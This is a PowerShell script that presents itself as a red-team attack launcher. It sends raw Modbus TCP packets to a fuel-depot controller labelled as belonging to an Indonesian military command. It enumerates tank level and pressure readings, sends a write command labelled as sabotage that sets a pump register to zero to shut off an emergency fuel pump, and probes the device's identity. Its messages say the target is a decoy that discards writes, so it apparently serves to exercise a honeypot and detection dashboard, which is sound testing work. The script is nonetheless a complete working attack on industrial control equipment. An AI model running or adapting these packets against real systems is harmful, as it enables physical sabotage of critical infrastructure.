param(
    [string]$TargetIP = "192.168.1.11",
    [int]$Port = 15030,
    [string]$Skenario = "all"
)

Write-Host "==========================================================================" -ForegroundColor Red
Write-Host "   RED-TEAM ATTACK LAUNCHER (PURE POWERSHELL - NO NMAP NEEDED)" -ForegroundColor Yellow
Write-Host "   Target IP : $TargetIP"
Write-Host "   Port      : $Port (KODAM IV Diponegoro - Depo BBM)"
Write-Host "   Dasbor HUD: https://cyber.steamcraft.online"
Write-Host "==========================================================================" -ForegroundColor Red
Write-Host ""

function Send-ModbusPacket([byte[]]$packet, [string]$label) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $connect = $client.BeginConnect($TargetIP, $Port, $null, $null)
        $success = $connect.AsyncWaitHandle.WaitOne(3000, $false)
        if (-not $success) {
            Write-Host ("[-] Gagal terhubung ke " + $TargetIP + ":" + $Port + " (Timeout).") -ForegroundColor Red
            return $null
        }
        $client.EndConnect($connect)
        $stream = $client.GetStream()
        $stream.WriteTimeout = 3000
        $stream.ReadTimeout = 3000

        Write-Host ("[+] Mengirim paket: " + $label + "...") -ForegroundColor Cyan
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        $stream.Write($packet, 0, $packet.Length)

        $resp = New-Object byte[] 64
        $bytesRead = $stream.Read($resp, 0, $resp.Length)
        $sw.Stop()
        $client.Close()

        $hex = [BitConverter]::ToString($resp, 0, $bytesRead)
        Write-Host ("    [OK RESPON DITERIMA] (" + $sw.ElapsedMilliseconds + " ms): " + $hex) -ForegroundColor Green
        return $resp[0..($bytesRead - 1)]
    }
    catch {
        Write-Host ("[-] Error: " + $_) -ForegroundColor Red
        return $null
    }
}

if ($Skenario -eq "1" -or $Skenario -eq "all") {
    Write-Host "[SKENARIO 1] RECONNAISSANCE & ENUMERASI TELEMETRI (FC 04)" -ForegroundColor Yellow
    $p = [byte[]]@(0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x04, 0x00, 0x00, 0x00, 0x05)
    $res = Send-ModbusPacket $p "Baca Register 0-4 (Level Tangki & Tekanan)"
    if ($res -and $res.Length -ge 19) {
        $tank = ($res[9] * 256) + $res[10]
        $press = (($res[11] * 256) + $res[12]) / 100
        Write-Host ("    [INTELIJEN] Tangki: " + $tank + " Liter | Tekanan: " + $press + " Bar") -ForegroundColor Magenta
    }
    Write-Host ""
}

if ($Skenario -eq "2" -or $Skenario -eq "all") {
    Write-Host "[SKENARIO 2] SABOTASE POMPA BBM DARURAT (FC 06 - WRITE KILL)" -ForegroundColor Red
    $p = [byte[]]@(0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x06, 0x00, 0x0B, 0x00, 0x00)
    $res = Send-ModbusPacket $p "Kirim Perintah Matikan Pompa (Register 11 = 0)"
    if ($res) {
        Write-Host "    [HASIL PENYERANG] Perintah Tulis DISETUJUI oleh Target! Pompa seolah-olah MATI." -ForegroundColor Green
        Write-Host "    [FAKTA DI WAYANG] Perintah dibuang dari PLC asli. PLC riil aman 100%!" -ForegroundColor Yellow
    }
    Write-Host ""
}

if ($Skenario -eq "3" -or $Skenario -eq "all") {
    Write-Host "[SKENARIO 3] INSPEKSI IDENTITAS PERANGKAT (FC 43)" -ForegroundColor Yellow
    $p = [byte[]]@(0x00, 0x03, 0x00, 0x00, 0x00, 0x05, 0x01, 0x2B, 0x0E, 0x01, 0x00)
    $res = Send-ModbusPacket $p "Kirim Probe Device Identification"
    Write-Host ""
}

Write-Host "[SELESAI] Buka Dasbor HUD di browser: https://cyber.steamcraft.online" -ForegroundColor Green
Write-Host "Periksa lonjakan log ancaman dan status alarm penulisan dialihkan!"
